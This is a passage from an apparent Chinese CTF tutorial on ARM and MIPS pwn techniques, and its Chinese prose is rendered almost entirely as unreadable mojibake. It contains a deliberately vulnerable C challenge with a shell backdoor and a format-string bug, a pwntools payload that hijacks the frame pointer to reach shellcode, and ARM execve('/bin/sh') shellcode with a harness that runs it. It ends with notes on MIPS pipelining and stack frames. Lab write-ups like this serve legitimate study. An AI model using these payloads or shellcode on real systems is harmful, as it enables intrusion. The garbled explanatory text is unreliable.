<p>ä¸è¿‡è¿™ä¹Ÿéœ€è¦åŸæœ¬çš„è¯»å–å‡½æ•°è®¾ç½®çš„bufé•¿åº¦è¶³å¤Ÿæ”¾ä¸‹æˆ‘ä»¬çš„shellcodeæ‰è¡Œï¼Œå·²ç»æˆåŠŸè¯»å–</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105115637.png" alt="image-20211105115637472"></p>
<p>è¿™é‡Œçš„fake_FPå°±èµ·ä½œç”¨äº†ï¼Œå› ä¸ºæˆ‘ä»¬åŠ«æŒäº†FPï¼Œæ‰€ä»¥åœ¨myFuncå‡½æ•°ï¼Œå³å­˜åœ¨æº¢å‡ºå‡½æ•°è¿”å›æ—¶ï¼Œé€šè¿‡</p>
<p><code>SUB     SP, R11, #4</code>å°†FPå‡4ä¹‹åèµ‹å€¼ç»™SPï¼Œå°±èƒ½åŠ«æŒæ ˆäº†ï¼Œ</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105120321.png" alt="image-20211105120320963"></p>
<p>ä¹‹åå†é€šè¿‡<code>POP     &#123;R11,PC&#125;</code>ï¼ŒåŠ«æŒPCï¼Œè¿›å…¥åˆ°shellcodeæ‰§è¡Œã€‚éœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œç”±äºæ˜¯popç»™PCï¼Œæ‰€ä»¥bssæ®µä¸Šè¿˜æ˜¯éœ€è¦æ”¾ä¸Šå¯¹åº”shellcodeå¤„çš„åœ°å€ï¼Œæ‰€ä»¥å‘é€shellcodeçš„è¯­å¥ä¸º</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(p32(shellcode_addr)+shellcode)</span><br></pre></td></tr></table></div></figure>

<p>æœ€åæˆåŠŸgetshellã€‚</p>

        <h4 id="ğŸ”ºå­˜åœ¨PIEæ—¶"   >
          <a href="#ğŸ”ºå­˜åœ¨PIEæ—¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºå­˜åœ¨PIEæ—¶" class="headerlink" title="ğŸ”ºå­˜åœ¨PIEæ—¶"></a>ğŸ”ºå­˜åœ¨PIEæ—¶</h4>
      <p>è¿™ç§ä¸€èˆ¬éƒ½æ˜¯éœ€è¦ç»“åˆçˆ†ç ´æ¥è¿›è¡Œäº†ï¼Œæˆ–è€…é¢˜ç›®æœ¬èº«æ³„éœ²åœ°å€ã€‚</p>

        <h2 id="3-å¶å­å‡½æ•°æº¢å‡º"   >
          <a href="#3-å¶å­å‡½æ•°æº¢å‡º" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-å¶å­å‡½æ•°æº¢å‡º" class="headerlink" title="3.å¶å­å‡½æ•°æº¢å‡º"></a>3.å¶å­å‡½æ•°æº¢å‡º</h2>
      
        <h3 id="1-æ ˆæ¨¡å‹-1"   >
          <a href="#1-æ ˆæ¨¡å‹-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ ˆæ¨¡å‹-1" class="headerlink" title="(1)æ ˆæ¨¡å‹"></a>(1)æ ˆæ¨¡å‹</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#æ³¨é‡Šå¤´</span><br><span class="line"></span><br><span class="line">+-------------+</span><br><span class="line">|             |</span><br><span class="line">|  padding    |</span><br><span class="line">+-------------+</span><br><span class="line">|  Last FP    | &lt;- frame pointer</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></div></figure>

<p>ä½†æ˜¯è¿™æ ·å°±ä¸å¥½åˆ©ç”¨ï¼Œåªèƒ½åŠ«æŒåˆ°ä¸Šä¸€å±‚å‡½æ•°çš„å‡½æ•°æ ˆï¼Œé‚£ä¹ˆé€šå¸¸ä¼šå°è¯•åŠ«æŒæ ˆè¿ç§»ä¸€æ®µè·ç¦»ï¼Œä½¿å¾—ä¸Šä¸€ä¸ªéå¶å­å‡½æ•°çš„å‰©ä¸‹çš„æ±‡ç¼–ä»£ç æ‰€ç”¨åˆ°çš„æ ˆä¸Šæ•°æ®æ˜¯æˆ‘ä»¬ä¼ªé€ çš„æ ˆä¸­çš„æ•°æ®ï¼Œè¿™æ ·å°±èƒ½å®ŒæˆåŠ«æŒä¸Šä¸€ä¸ªéå¶å­å‡½æ•°çš„è¿”å›åœ°å€ã€‚</p>

        <h3 id="2-é¢˜ç›®ï¼š-1"   >
          <a href="#2-é¢˜ç›®ï¼š-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-é¢˜ç›®ï¼š-1" class="headerlink" title="(2)é¢˜ç›®ï¼š"></a>(2)é¢˜ç›®ï¼š</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> bss[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myFunc</span><span class="params">(<span class="keyword">char</span>* nameSrc,<span class="keyword">int</span> amount,<span class="keyword">int</span>* i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        name[i[<span class="number">0</span>]] = nameSrc[i[<span class="number">0</span>]];</span><br><span class="line">        i[<span class="number">0</span>] = i[<span class="number">0</span>] + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>( i[<span class="number">0</span>] == amount)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i[<span class="number">2</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo &#x27;PIG-007!&#x27;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome to my world!I am PIG-007!&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input your name:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,bss,<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello! &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(bss);</span><br><span class="line">    myFunc(bss,<span class="built_in">strlen</span>(bss),i);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-åˆ©ç”¨ï¼š-1"   >
          <a href="#3-åˆ©ç”¨ï¼š-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-åˆ©ç”¨ï¼š-1" class="headerlink" title="(3)åˆ©ç”¨ï¼š"></a>(3)åˆ©ç”¨ï¼š</h3>
      <p>ç›´æ¥åŠ«æŒLast FPï¼Œç„¶ååˆ©ç”¨ä¸Šä¸€å±‚å‡½æ•°è¿”å›æ—¶åŠ«æŒæ ˆï¼Œåœ¨æ ˆä¸Šä¿å­˜shellcodeåœ°å€ï¼Œç›´æ¥è¿›å…¥shellcodeå³å¯getshellã€‚</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">shellcode_addr =  bss_addr + <span class="number">0x20</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;A&quot;</span>*<span class="number">0x14</span></span><br><span class="line">payload += p32(bss_addr + <span class="number">0x18</span>)</span><br><span class="line">payload += p32(bss_addr + <span class="number">0x18</span>)</span><br><span class="line">payload += p32(shellcode_addr)</span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment">#mulArchDbg()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>

<p>pop {fp}ä¹‹åå·²ç»åŠ«æŒæ ˆåˆ°bssæ®µä¸Šäº†</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211106220032.png" alt="image-20211106220025308"></p>
<p>è¿”å›mainå‡½æ•°ä¹‹åï¼Œåˆ©ç”¨mainå‡½æ•°ä¸­çš„è¿”å›æŒ‡ä»¤<code>sub sp,fp,#4</code>å®Œæˆæ ˆåŠ«æŒ</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211106220242.png" alt="image-20211106220242850"></p>
<p>ç„¶åå°±åˆ©ç”¨<code>pop &#123;fp, pc&#125;</code>æ¥åŠ«æŒè¿”å›åœ°å€ï¼Œè¿›å…¥åˆ°æˆ‘ä»¬è¾“å…¥çš„bssæ®µä¸Šshellcodeçš„åœ°æ–¹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211106221534.png" alt="image-20211106221534722"></p>

        <h4 id="æ³¨ï¼š"   >
          <a href="#æ³¨ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ³¨ï¼š" class="headerlink" title="æ³¨ï¼š"></a>æ³¨ï¼š</h4>
      <p>ä¸åœ¨bssæ®µä¸Šæ—¶ï¼Œæˆ‘ä»¬åŠ«æŒå®ŒLast FPï¼Œè¿”å›ä¸Šä¸€å±‚å‡½æ•°æ ˆä¸­æ—¶ï¼Œå½“æº¢å‡ºé•¿åº¦è¶³å¤Ÿï¼Œå¯ç›´æ¥ä¿®æ”¹ä¸Šä¸€å±‚å‡½æ•°æ ˆä¸­çš„æ•°æ®ï¼Œç›¸å½“äºå°±æ˜¯éå¶å­å‡½æ•°çš„æº¢å‡ºäº†ã€‚</p>
<p>è‡³äºæº¢å‡ºé•¿åº¦ä¸å¤Ÿï¼Œåªèƒ½åŠ«æŒLast FPçš„æ—¶å€™ï¼Œåˆæ— æ³•æ³„éœ²åœ°å€ï¼Œæ„Ÿè§‰ä¸å¤ªèƒ½æï¼Œæˆ–è€…ä¸Šä¸Šä¸€å±‚å‡½æ•°ä¸­æœ‰å‰©ä¸‹å¯åˆ©ç”¨çš„æ•°æ®ï¼Œé‚£ä¹ˆå°±éƒ¨åˆ†åŠ«æŒLast FPï¼Œåˆ©ç”¨ä¸Šä¸Šä¸€å±‚å‡½æ•°ä¸­å‰©ä¸‹çš„æ±‡ç¼–æ¥getshellï¼Œè¿™ä¸ªå…·ä½“çœ‹é¢˜ç›®ã€‚</p>

        <h2 id="4-æ ¼å¼åŒ–å­—ç¬¦ä¸²"   >
          <a href="#4-æ ¼å¼åŒ–å­—ç¬¦ä¸²" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-æ ¼å¼åŒ–å­—ç¬¦ä¸²" class="headerlink" title="4.æ ¼å¼åŒ–å­—ç¬¦ä¸²"></a>4.æ ¼å¼åŒ–å­—ç¬¦ä¸²</h2>
      <p>armæ¶æ„ä¸‹çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²çš„é¡ºåºæ˜¯R1,R2,R3,æ ˆï¼Œå…¶ä»–çš„ç›¸å…³åˆ©ç”¨æ–¹å¼ä¹Ÿæ˜¯ç±»ä¼¼ï¼Œä¸å†å¤šè¯´ã€‚</p>

        <h2 id="5-å †"   >
          <a href="#5-å †" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-å †" class="headerlink" title="5.å †"></a>5.å †</h2>
      <p>å †çš„åˆ©ç”¨æ–¹æ³•ä¹Ÿæ˜¯ç±»ä¼¼çš„ã€‚</p>
<p>å‚è€ƒï¼š</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/199112#h3-20" >ARMæ¶æ„ä¸‹çš„ Pwn çš„ä¸€èˆ¬è§£å†³æ€è·¯ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="Shellcode"   >
          <a href="#Shellcode" class="heading-link"><i class="fas fa-link"></i></a><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *SC =      <span class="string">&quot;\x01\x30\x8f\xe2&quot;</span></span><br><span class="line">                <span class="string">&quot;\x13\xff\x2f\xe1&quot;</span></span><br><span class="line">                <span class="string">&quot;\x78\x46\x0e\x30&quot;</span></span><br><span class="line">                <span class="string">&quot;\x01\x90\x49\x1a&quot;</span></span><br><span class="line">                <span class="string">&quot;\x92\x1a\x08\x27&quot;</span></span><br><span class="line">                <span class="string">&quot;\xc2\x51\x03\x37&quot;</span></span><br><span class="line">                <span class="string">&quot;\x01\xdf\x2f\x62&quot;</span></span><br><span class="line">                <span class="string">&quot;\x69\x6e\x2f\x2f&quot;</span></span><br><span class="line">                <span class="string">&quot;\x73\x68&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> payload[<span class="number">34</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(payload, SC, <span class="number">34</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;Length: %d\n&quot;</span>, <span class="built_in">strlen</span>(SC));</span><br><span class="line">    (*(<span class="keyword">void</span>(*)()) payload) ();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h1 id="ä¸‰ã€MIPS"   >
          <a href="#ä¸‰ã€MIPS" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸‰ã€MIPS" class="headerlink" title="ä¸‰ã€MIPS"></a>ä¸‰ã€MIPS</h1>
      <p>ä¸»è¦ä»‹ç»mipselæ¶æ„çš„ï¼Œå°ç«¯åºï¼Œå¤§ç«¯çš„mipså¾ˆå°‘è€ƒåˆ°ï¼Œè€Œä¸”ä¹ŸåŸºæœ¬éƒ½æ˜¯å¤§åŒå°å¼‚</p>

        <h2 id="1-æµæ°´çº¿ç‰¹ç‚¹"   >
          <a href="#1-æµæ°´çº¿ç‰¹ç‚¹" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æµæ°´çº¿ç‰¹ç‚¹" class="headerlink" title="1.æµæ°´çº¿ç‰¹ç‚¹"></a>1.æµæ°´çº¿ç‰¹ç‚¹</h2>
      <p>ä»¥ä¸‹æŒ‡ä»¤çš„ï¼Œstrchr å‡½æ•°çš„å‚æ•°æ¥è‡ª $s0 è€Œä¸æ˜¯ $s2</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $a0, $s2;</span><br><span class="line">jalr strchr;</span><br><span class="line">move $a0, $s0;</span><br></pre></td></tr></table></div></figure>


        <h2 id="ğŸ”ºæ³¨ï¼šæµæ°´çº¿"   >
          <a href="#ğŸ”ºæ³¨ï¼šæµæ°´çº¿" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºæ³¨ï¼šæµæ°´çº¿" class="headerlink" title="ğŸ”ºæ³¨ï¼šæµæ°´çº¿"></a>ğŸ”ºæ³¨ï¼šæµæ°´çº¿</h2>
      <p>å³è·³è½¬ä¹‹å‰ä¼šå…ˆä¸€æ­¥åŠ è½½ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œæ‰€ä»¥åœ¨å¯»æ‰¾ROPæ—¶ï¼Œæ³¨æ„çœ‹ä¸‹ä¸€æ­¥æŒ‡ä»¤éƒ½æ˜¯ä»€ä¹ˆï¼Œä¸ç„¶è·³è½¬è¿‡å»å‚æ•°æˆ–è€…æ ˆå¸§éƒ½æœ‰å¯èƒ½ä¼šå‡ºé”™çš„ã€‚</p>
<p>ä½†æ˜¯å› ä¸ºé€šå¸¸PWNé¢˜çš„MIPSé€šå¸¸æ˜¯ç”¨qemuçš„useræ¨¡å¼è¿è¡Œçš„ï¼Œè¿™ä¸ªå¯èƒ½å¯¼è‡´æŒ‡ä»¤æµæ°´æœ‰æ—¶å€™è¡¨ç°ä¸å‡ºæ¥ï¼Œæ‰€ä»¥ä¸æ²¡æœ‰è°ƒç”¨å‡½æ•°sleep(1)å»å°†æ•°æ®åŒºåˆ·æ–°åˆ°æŒ‡ä»¤åŒºåŸŸä¹Ÿæ˜¯å¯ä»¥æ‹¿åˆ°shellçš„ï¼›ä½†æ˜¯å¦‚æœé¢˜ç›®ä½¿ç”¨systemæ¨¡å¼éƒ¨ç½²ï¼Œæ·»åŠ è°ƒç”¨å‡½æ•°åˆ·æ–°æ•°æ®åŒºåŸŸå†è·³è½¬åˆ°shellcodeå°±å¾ˆå¿…è¦äº†ï¼Œä½†å¦‚æœæ˜¯ROPæ¥getshellå€’æ˜¯ä¸ç”¨åˆ·æ–°æ•°æ®ã€‚</p>

        <h2 id="2-æ ˆæœºåˆ¶"   >
          <a href="#2-æ ˆæœºåˆ¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ ˆæœºåˆ¶" class="headerlink" title="2.æ ˆæœºåˆ¶"></a>2.æ ˆæœºåˆ¶</h2>
      
        <h3 id="å‡½æ•°è°ƒç”¨"   >
          <a href="#å‡½æ•°è°ƒç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‡½æ•°è°ƒç”¨" class="headerlink" title="å‡½æ•°è°ƒç”¨"></a>å‡½æ•°è°ƒç”¨</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00409A14                 la      $t9, sobj_del</span><br><span class="line">.text:00409A18                 nop</span><br><span class="line">.text:00409A1C                 jalr    $t9 ; sobj_del</span><br><span class="line">.text:00409A20                 move    $a0, $s5</span><br><span class="line">.text:00409A24                 lw      $gp, 0x4C0+var_4B0($sp)</span><br></pre></td></tr></table></div></figure>

<p>å¸¸è§äºåº“å‡½æ•°</p>
<ul>
<li><p>é€šè¿‡<code>$t9</code>æ¥è·³è½¬</p>
</li>
<li><p>è·³è½¬æŒ‡ä»¤ä¸º<code>jalr</code>ï¼Œä¿å­˜è¿”å›åœ°å€åˆ°<code>$ra</code>ï¼Œè¿™é‡Œçš„è¿”å›åœ°å€å³ä¸º</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00409A24                 lw      $gp, 0x4C0+var_4B0($sp)</span><br></pre></td></tr></table></div></figure></li>
<li><p>ç”±äºäº”çº§æµæ°´çº¿ï¼Œæ‰€ä»¥é€šå¸¸åœ¨è·³è½¬æŒ‡ä»¤ä¸‹ä¸€æ¡æŒ‡ä»¤åŠ è½½å‚æ•°ï¼Œè¿™é‡Œå³ä¸º</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00409A20                 move    $a0, $s5</span><br></pre></td></tr></table></div></figure>

<p>å½“ç„¶å¦‚æœæ¶‰åŠåˆ°å¤šä¸ªå‚æ•°å°±ä¼šæå‰åŠ è½½äº†</p>
</li>
</ul>

        <h3 id="å‡½æ•°æ ˆåŠ è½½"   >
          <a href="#å‡½æ•°æ ˆåŠ è½½" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‡½æ•°æ ˆåŠ è½½" class="headerlink" title="å‡½æ•°æ ˆåŠ è½½"></a>å‡½æ•°æ ˆåŠ è½½</h3>
      
        <h4 id="å¶å­å‡½æ•°"   >
          <a href="#å¶å­å‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#å¶å­å‡½æ•°" class="headerlink" title="å¶å­å‡½æ•°"></a>å¶å­å‡½æ•°</h4>
      <p>å¶å­å‡½æ•°ä¸éœ€è¦å°†è¿”å›åœ°å€ä¿å­˜åˆ°æ ˆä¸Šï¼Œæ‰€ä»¥ä¸€èˆ¬åªéœ€è¦å°†å‚æ•°æ”¾å…¥æ ˆä¸­</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//æ ˆç©ºé—´å¼€è¾Ÿ</span><br><span class="line">.text:00400834                 addiu   $sp, -0x30</span><br><span class="line">//æ ˆæŒ‡é’ˆè®¾ç½®</span><br><span class="line">.text:00400838                 sw      $fp, 0x2C+var_s0($sp)</span><br><span class="line">.text:0040083C                 move    $fp, $sp</span><br><span class="line">//å‚æ•°å…¥æ ˆ</span><br><span class="line">.text:00400840                 sw      $a0, 0x2C+test($fp)</span><br></pre></td></tr></table></div></figure>

<p>æœ‰çš„ä¹Ÿä¼šæœ‰å…³äº<code>$gp</code>æŒ‡é’ˆçš„è®¾ç½®ï¼Œä¸€èˆ¬æ˜¯ç”¨åˆ°äº†å…¨å±€å˜é‡ï¼Œå¸¸é‡ä»€ä¹ˆçš„</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00409480                 lui     $gp, 0x43  # &#x27;C&#x27;</span><br><span class="line">.text:00409484                 addiu   $sp, -0x4E8</span><br><span class="line">.text:00409488                 li      $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0)</span><br></pre></td></tr></table></div></figure>


        <h4 id="éå¶å­å‡½æ•°"   >
          <a href="#éå¶å­å‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#éå¶å­å‡½æ•°" class="headerlink" title="éå¶å­å‡½æ•°"></a>éå¶å­å‡½æ•°</h4>
      <p>éå¶å­å‡½æ•°éœ€è¦å°†è¿”å›åœ°å€ä¿å­˜åˆ°æ ˆä¸Š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00409480                 lui     $gp, 0x43  # &#x27;C&#x27;</span><br><span class="line">//æ ˆç©ºé—´å¼€è¾Ÿ</span><br><span class="line">.text:00409484                 addiu   $sp, -0x4E8</span><br><span class="line">.text:00409488                 li      $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0)</span><br><span class="line">.text:0040948C                 sw      $ra, 0x4C0+var_s24($sp)</span><br><span class="line">.text:00409490                 sw      $fp, 0x4C0+var_s20($sp)</span><br><span class="line">//è¿”å›åœ°å€$raå…¥æ ˆ</span><br></pre></td></tr></table></div></figure>


        <h3 id="å‡½æ•°è¿”å›"   >
          <a href="#å‡½æ•°è¿”å›" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‡½æ•°è¿”å›" class="headerlink" title="å‡½æ•°è¿”å›"></a>å‡½æ•°è¿”å›</h3>
      
        <h4 id="å¶å­å‡½æ•°-1"   >
          <a href="#å¶å­å‡½æ•°-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#å¶å­å‡½æ•°-1" class="headerlink" title="å¶å­å‡½æ•°"></a>å¶å­å‡½æ•°</h4>
      <p>å¶å­å‡½æ•°ç›´æ¥é€šè¿‡<code>$ra</code>å¯„å­˜å™¨è¿”å›</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//....ä¸€äº›å‚æ•°åŠ è½½</span><br><span class="line">.text:00409A54                 jr      $ra</span><br><span class="line">//æ ˆç©ºé—´é”€æ¯</span><br><span class="line">.text:00409A58                 addiu   $sp, 0x4E8</span><br></pre></td></tr></table></div></figure>


        <h4 id="éå¶å­å‡½æ•°-1"   >
          <a href="#éå¶å­å‡½æ•°-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#éå¶å­å‡½æ•°-1" class="headerlink" title="éå¶å­å‡½æ•°"></a>éå¶å­å‡½æ•°</h4>
      <p>éå¶å­å‡½æ•°éœ€è¦ä»æ ˆä¸­è·å–è¿”å›åœ°å€åˆ°<code>$ra</code>å¯„å­˜å™¨ï¼Œç„¶åä¹Ÿæ˜¯é€šè¿‡<code>$ra</code>å¯„å­˜å™¨è¿”å›</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//ä¸€äº›å¤„ç†å·¥ä½œ....</span><br><span class="line">.text:0040091C                 move    $sp, $fp</span><br><span class="line">//è·å–æ ˆä¸Šçš„è¿”å›åœ°å€</span><br><span class="line">.text:00400920                 lw      $ra, 0x28+var_s4($sp)</span><br><span class="line">.text:00400924                 lw      $fp, 0x28+var_s0($sp)</span><br><span class="line">//é€šè¿‡$raè¿”å›</span><br><span class="line">.text:00400928                 jr      $ra</span><br><span class="line">//æ ˆç©ºé—´é”€æ¯</span><br><span class="line">.text:0040092C                 addiu   $sp, 0x30</span><br></pre></td></tr></table></div></figure>


        <h3 id="æ€»ç»“ï¼š"   >
          <a href="#æ€»ç»“ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h3>
      <p>æ€»çš„æ¥è¯´ï¼Œå’Œx86ä¹Ÿæ˜¯æœ‰ç‚¹ç›¸ä¼¼ï¼Œä¸åŒçš„å°±æ˜¯å…³äº<code>$ra</code>å¯„å­˜å™¨çš„ä½¿ç”¨ï¼Œä»¥åŠå¶å­å‡½æ•°å’Œéå¶å­å‡½æ•°çš„åŒºåˆ«ï¼Œè¿˜æœ‰ä¸€äº›äº”çº§æµæ°´çº¿æœºåˆ¶ã€‚</p>

